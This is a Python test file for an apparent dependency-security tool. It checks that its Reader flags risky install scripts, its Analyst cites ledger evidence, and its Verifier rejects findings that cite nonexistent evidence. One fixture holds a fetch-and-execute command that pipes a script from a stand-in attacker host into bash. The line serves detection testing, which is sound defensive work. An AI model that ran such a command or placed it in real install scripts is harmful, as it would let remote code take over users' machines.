"""
Tests for Day 1 AI Layer: Reader, Analyst, Verifier, and LLM Client.
Validates that LLM claims are grounded in the Evidence Ledger and verified by plain code.
"""
from pathlib import Path
from guardian.analyst import Analyst
from guardian.ledger import Ledger
from guardian.llm.client import LLMClient
from guardian.models import Component, Finding
from guardian.reader import Reader
from guardian.verifier import Verifier


def test_llm_client_detection():
    client = LLMClient()
    # Should not raise; is_available returns False when no API key is provided
    assert isinstance(client.is_available(), bool)


def test_reader_quarantine_heuristic(tmp_path):
    ledger = Ledger(tmp_path)
    ev = ledger.add_evidence(
        kind="install_script",
        source="hunter",
        component="malicious-pkg",
        data={"script": "curl -s http://attacker.com/payload.sh | bash"}
    )
    reader = Reader(ledger, llm_client=None)
    reader.run()

    claims = [c for c in ledger.claims if c.get("agent") == "reader"]
    assert len(claims) == 1
    assert claims[0]["data"]["analysis"]["downloads_and_executes"] is True
    assert claims[0]["data"]["analysis"]["risk_level"] == "critical"


def test_analyst_prioritizes_and_cites_evidence(tmp_path):
    ledger = Ledger(tmp_path)
    e1 = ledger.add_evidence(
        kind="vulnerability",
        source="hunter",
        component="axios@0.21.1",
        data={"cve": "CVE-2020-28168"}
    )
    f1 = ledger.add_finding(
        type="vulnerability",
        component="axios@0.21.1",
        path=["demo-app", "axios"],
        evidence_ids=[e1.id],
        risk="high",
        confidence_basis="OSV lookup",
        context={},
        explanation="Server-Side Request Forgery vulnerability.",
        skeptic={},
        remediation={},
        status="unverified",
        cve="CVE-2020-28168",
        cvss="7.5",
        fix_version="0.21.2",
    )

    analyst = Analyst(ledger, llm_client=None)
    analyst.run()

    assert analyst.executive_summary
    assert len(analyst.prioritization) == 1
    assert e1.id in analyst.prioritization[0]["explanation"]
    assert "ai_priority" in f1.context


def test_verifier_accepts_valid_citations_and_rejects_hallucinations(tmp_path):
    ledger = Ledger(tmp_path)
    e1 = ledger.add_evidence(
        kind="component",
        source="mapper",
        component="lodash",
        data={"version": "4.17.20"}
    )

    # Valid finding citing e1.id
    f_valid = ledger.add_finding(
        type="vulnerability",
        component="lodash@4.17.20",
        path=["demo-app", "lodash"],
        evidence_ids=[e1.id],
        risk="high",
        confidence_basis="OSV rule",
        context={},
        explanation=f"Prototype pollution risk cited in [{e1.id}].",
        skeptic={},
        remediation={},
        status="unverified",
    )

    # Hallucinated finding citing nonexistent E-999
    f_fake = ledger.add_finding(
        type="vulnerability",
        component="fake-pkg@1.0.0",
        path=["demo-app", "fake-pkg"],
        evidence_ids=["E-999"],
        risk="high",
        confidence_basis="LLM hallucination",
        context={},
        explanation="Made up issue citing [E-999].",
        skeptic={},
        remediation={},
        status="unverified",
    )

    verifier = Verifier(ledger)
    summary = verifier.run()

    assert summary["verified"] == 1
    assert summary["unverified"] == 1
    assert f_valid.status == "verified"
    assert f_fake.status == "unverified"
    assert "VERIFIER WARNING" in f_fake.confidence_basis
